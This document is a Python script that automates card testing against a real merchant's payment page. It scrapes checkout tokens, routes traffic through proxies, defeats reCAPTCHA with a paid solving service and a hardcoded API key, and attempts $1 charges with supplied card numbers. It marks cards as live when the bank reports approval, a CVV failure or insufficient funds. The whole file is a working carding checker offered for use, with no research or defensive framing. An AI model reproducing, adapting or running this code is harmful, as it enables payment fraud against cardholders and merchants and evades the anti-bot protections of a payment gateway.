""""
import httpx
import asyncio
import capsolver
from faker import Faker

CAPSOLVER_KEY = "CAP-02DB3E5188C3DDD58C43DCF9B69FE560"
SITE_KEY = "6LfBt9wmAAAAAFlQ5-gfCfZNq4OfsDjgam-BI73y"
fake = Faker()

class CaptchaSolver:
    @staticmethod
    async def solve_v2(sitekey: str, url: str) -> str:
        try:
            capsolver.api_key = CAPSOLVER_KEY
            loop = asyncio.get_event_loop()
            solution = await loop.run_in_executor(
                None,
                lambda: capsolver.solve({
                    "type": "ReCaptchaV2TaskProxyLess", 
                    "websiteURL": url,
                    "websiteKey": sitekey,
                })
            )
            return solution.get("gRecaptchaResponse", "")
        except Exception as e:
            print(f"Error solving captcha: {e}")
            return ""

async def pzy2(cc, mes, ano, cvv, proxyg):
    max_retries = 3
    retries = 0

    while retries < max_retries:
        try:
            async with httpx.AsyncClient(follow_redirects=True, verify=False, proxies=proxyg, timeout=None) as session:
                response = await session.get('https://www.mas-cpas.com/glossary')
                response_text = response.text
                xlogin = response_text.split('name="x_login" value="')[1].split('"')[0]
                xsecuence = response_text.split('name="x_fp_sequence" value="')[1].split('"')[0]
                xhash = response_text.split('name="x_fp_hash" value="')[1].split('"')[0]

                headers = {
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                    'accept-language': 'es-ES,es;q=0.9,en;q=0.8',
                    'cache-control': 'max-age=0',
                    'content-type': 'application/x-www-form-urlencoded',
                    'origin': 'https://www.mas-cpas.com',
                    'priority': 'u=0, i',
                    'referer': 'https://www.mas-cpas.com/',
                    'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-fetch-dest': 'document',
                    'sec-fetch-mode': 'navigate',
                    'sec-fetch-site': 'cross-site',
                    'sec-fetch-user': '?1',
                    'upgrade-insecure-requests': '1',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',
                }

                data = {
                    'x_login': xlogin,
                    'x_show_form': 'PAYMENT_FORM',
                    'x_fp_sequence': xsecuence,
                    'x_fp_hash': xhash,
                    'x_amount': '',
                    'x_currency_code': 'USD',
                    'x_test_request': 'FALSE',
                    'x_relay_response': '',
                    'donation_prompt': '',
                    'button_code': 'Pay Now ARRIAGA & SZEGFU, CPAs, APC',
                }

                req2 = await session.post('https://checkout.globalgatewaye4.firstdata.com/pay', headers=headers, data=data)
                captcha_response = await CaptchaSolver.solve_v2(SITE_KEY, 'https://checkout.globalgatewaye4.firstdata.com/payeezyhcoapp/transaction/v1')

                if captcha_response:
                    headers = {
                        'accept': 'application/json, text/javascript, */*; q=0.01',
                        'accept-language': 'es-ES,es;q=0.9,en;q=0.8',
                        'content-type': 'application/json; charset=UTF-8',
                        'hcorequestsource': 'CloverHCO',
                        'origin': 'https://checkout.globalgatewaye4.firstdata.com',
                        'priority': 'u=1, i',
                        'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
                        'sec-ch-ua-mobile': '?0',
                        'sec-ch-ua-platform': '"Windows"',
                        'sec-fetch-dest': 'empty',
                        'sec-fetch-mode': 'cors',
                        'sec-fetch-site': 'same-origin',
                        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',
                        'x-requested-with': 'XMLHttpRequest',
                    }

                    json_data = {
                        'cc_expiry': f'{mes}{ano}',
                        'cardholder_name': 'Sebastian',
                        'cc_number': cc,
                        'customerEmail': '',
                        'paymentType': 'payNowDonateNow',
                        'customerFirstName': '',
                        'customerLastName': '',
                        'tax1_amount': '',
                        'customer_ref': '',
                        'zip': '07050',
                        'password': '',
                        'transaction_type': '00',
                        'xlogin': xlogin,
                        'gateway_id': '',
                        'split_tender_id': '',
                        'language': 'en',
                        'hashKey': xhash,
                        'amount': '1',
                        'recurringPlanId': '',
                        'recurringPlanName': '',
                        'recurringAmount': '',
                        'recurringActive': '',
                        'recurringInterval': '',
                        'recurringIntervalCount': '',
                        'recurringMerchantId': '',
                        'recurringDeveloperAppId': '',
                        'recurringSubscriptionCount': '',
                        'recurringActiveSubscriptionCount': '',
                        'recurringStartDate': '',
                        'recurringEndDate': '',
                        'recaptchaToken': captcha_response,
                        'address': {
                            'zip': '07050',
                        },
                        'cvd_presence_indicator': '9',
                    }

                    req3 = await session.post(
                        'https://checkout.globalgatewaye4.firstdata.com/payeezyhcoapp/transaction/v1',
                        headers=headers,
                        json=json_data,
                    )

                    msg = await req3.text()
                    try:
                        exact_message = msg.split('"exact_message":"')[1].split('"')[0]
                    except IndexError:
                        exact_message = "No disponible"

                    try:
                        bank_message = msg.split('"bank_message":"')[1].split('"')[0]
                    except IndexError:
                        bank_message = "No disponible"

                    try:
                        avs = msg.split('"avs":"')[1].split('"')[0]
                    except IndexError:
                        avs = "No disponible"

                    if "Approved" in bank_message:
                        status = "Approved ✅"
                    elif "CVV2/VAK Failure" in bank_message:
                        status = "Approved ✅"
                    elif "Insufficient Funds" in bank_message:
                        status = "Approved ✅"
                    elif "Address not Verified" in msg:
                        status = "Approved "
                    else:
                        status = "Declined ❌"

                    if "No disponible" in [exact_message, bank_message, avs]:
                        retries += 1
                        continue

                    return exact_message, avs, bank_message, status

        except Exception as e:
            retries += 1
            if retries >= max_retries:
                return "Error después de reintentos", "No disponible", "No disponible", "Declined ❌"
            """""